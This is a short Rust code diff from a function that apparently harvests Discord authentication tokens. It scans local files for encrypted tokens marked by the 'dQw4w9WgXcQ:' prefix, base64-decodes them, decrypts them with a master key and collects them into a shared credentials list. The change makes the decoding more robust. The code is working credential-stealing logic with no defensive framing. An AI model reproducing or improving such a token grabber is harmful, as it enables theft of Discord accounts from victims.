@@ -115,8 +115,10 @@ pub async fn get_discord_tokens(local_state_path: &str, path: &str, encrypted_re
                                 if let Ok(_) = reader.read_to_end(&mut contents) {
                                     for line in String::from_utf8_lossy(&contents).lines().map(|x| x.trim().to_string()) {
                                         for y in encrypted_regex_pattern.find_iter(&line) {
-                                            if let Ok(token) = decrypt_token(&utils::decode_base64(y.as_str().split("dQw4w9WgXcQ:").collect::<Vec<_>>()[1]).unwrap()[..], &master_key) {
-                                                new_credentials.lock().unwrap().token.push(token);
+                                            if let Ok(bytes) = utils::decode_base64(y.as_str().split("dQw4w9WgXcQ:").collect::<Vec<_>>()[1]) {
+                                                if let Ok(token) = decrypt_token(&bytes, &master_key) {
+                                                    new_credentials.lock().unwrap().token.push(token);
+                                                }
                                             }
                                         }
                                     }
